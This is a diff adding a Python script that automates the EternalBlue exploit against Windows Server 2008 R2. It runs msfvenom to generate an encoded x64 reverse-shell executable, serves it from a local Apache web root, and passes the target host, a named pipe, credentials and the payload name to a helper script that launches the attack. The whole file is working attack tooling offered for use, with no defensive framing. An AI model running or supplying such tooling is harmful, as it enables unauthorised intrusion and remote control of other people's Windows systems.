@@ -1,0 +1,31 @@
+import os
+import sys
+import urllib
+from os import system, name
+import os.path
+
+
+
+def lets_go(lhost, lport, payl):       
+       os.system("msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -e x64/xor -i 5 -f exe -o /var/www/html/%s.exe"%(lhost,lport,payl))
+       def clear(): _ = system('clear')
+       clear()
+       if os.path.isfile('/var/www/html/%s.exe'%(payl)): print ("Payload Successfuly Generated")
+       else: print("Failed to create payload, check if you have metasploit") 
+       os.system("/etc/init.d/apache2 start")
+def pwn(rhost, namedpipes, lhost, lport, payl, USERNAME, PASSWORD):
+       os.system("python automation-dependency.py %s %s %s %s %s %s"%(rhost,namedpipes,USERNAME,PASSWORD,lhost,payl))
+print("""This an automation script for the eternalblue vulnerability
+         [*]Tested on windows server 2008 R2
+         run the script as root ;)""")
+
+print("First I need you to fill some parameters")
+lhost = raw_input("Enter LHOST: ")
+namedpipes = raw_input("enter a namedpipe, maybe take a look at my namedpipes.txt gift for you ;) :")
+lport = raw_input("Enter LPORT: ")
+rhost = raw_input("Enter RHOST: ")
+payl  = raw_input("Enter Payload Name: ")
+USERNAME = raw_input("enter a valid username:")
+PASSWORD = raw_input("enter a valid password:")
+lets_go(lhost, lport, payl)
+pwn(rhost, namedpipes,lhost, lport, payl, USERNAME, PASSWORD)
